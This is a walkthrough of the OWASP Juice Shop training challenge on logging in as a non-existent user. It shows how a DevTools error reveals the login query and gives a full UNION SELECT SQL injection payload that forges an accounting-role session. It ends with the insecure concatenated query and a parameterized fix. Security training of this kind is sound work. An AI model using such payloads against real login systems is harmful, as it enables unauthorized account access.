OWASP Juice Shop: Login with Non-Existing User via SQL Injection

Challenge Overview

In web applications that construct SQL queries by concatenating user inputs directly into query strings without proper sanitization or parameterization, attackers can inject SQL commands. In this challenge from OWASP Juice Shop, the login interface contains a SQL injection (SQLi) vulnerability. This vulnerability permits a UNION SELECT payload that dynamically creates a valid user session in memory for a non-existent account without registering it in the database.

Step-by-Step Breakdown

1. Identifying the Vulnerability (DevTools Inspection)

Access the application login interface at http://localhost:3000/#/login.

Open the Browser Developer Tools (F12 or Ctrl+Shift+I) and navigate to the Network tab.

Submit a single quote (') in the Email field and any arbitrary string in the Password field.

Inspect the HTTP 500 Internal Server Error response in the DevTools panel to view the database error message revealing the internal query structure:

{
  "sql": "SELECT * FROM Users WHERE email = ''' AND password = '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"
}


2. Determining the Database Schema

A UNION SELECT statement requires that the injected query returns the exact number of columns with matching data types expected by the backend Users model.

Exfiltrating the schema definition or analyzing the model structure reveals that the Users table consists of 13 attributes:

id

username

email

password

role

deluxeToken

lastLoginIp

profileImage

totpSecret

isActive

createdAt

updatedAt

deletedAt

3. Constructing the Payload

The payload must fulfill two objectives:

Invalidate the original query: Use a single quote ' so the initial WHERE clause condition evaluates to false or produces no results.

Inject static values via UNION SELECT: Construct a mock record returning the exact schema structure, setting target attributes like email and role to desired values.

Payload Structure:

' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--


4. Execution & Authentication Bypass

Enter the crafted payload into the Email input field.

Enter any value into the Password input field.

Click Log in.

The backend executes the injected query, receives the static row generated by the UNION operation, validates the structure, generates a signed JSON Web Token (JWT), and initiates an authenticated session for acc0unt4nt@juice-sh.op.

Defensive Remediation: Parameterized Queries

To prevent SQL Injection vulnerabilities, application logic should never concatenate raw user inputs into SQL strings. Instead, use parameterized queries (prepared statements) or Object-Relational Mapping (ORM) frameworks like Sequelize.

Insecure Pattern (Direct String Concatenation):

// INSECURE: Vulnerable to SQL injection
db.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${md5(req.body.password)}'`);


Secure Pattern (Parameterized Query):

// SECURE: Uses prepared statements with placeholders
db.sequelize.query(
  'SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL',
  {
    replacements: { email: req.body.email, password: md5(req.body.password) },
    type: QueryTypes.SELECT
  }
);
